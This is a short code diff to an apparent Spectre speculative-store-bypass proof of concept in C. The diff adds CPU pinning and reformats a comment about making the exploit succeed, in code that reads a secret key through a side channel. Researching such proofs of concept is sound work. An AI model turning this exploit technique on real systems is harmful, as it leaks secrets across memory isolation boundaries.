@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <stdint.h>
 #include <stdio.h>
 #include <string.h>
@@ -55,12 +56,12 @@ char spectre_ssb(size_t to_read) {
 }
 
 int main(void) {
-  /// Putting the probe not in a COW page causes the exploit to fail. It just makes it 
-  /// easier to read the public key and not perform the bypass
+  pin_cpu0();
+  /// Putting the probe not in a COW page causes the exploit to fail. It just
+  /// makes it easier to read the public key and not perform the bypass
   for (int i = 0; i < sizeof(probe); i++) {
     probe[i] = 1;
   }
-
 
   int len = strlen(secret_key);
   for (int i = 0; i < len; i++) {
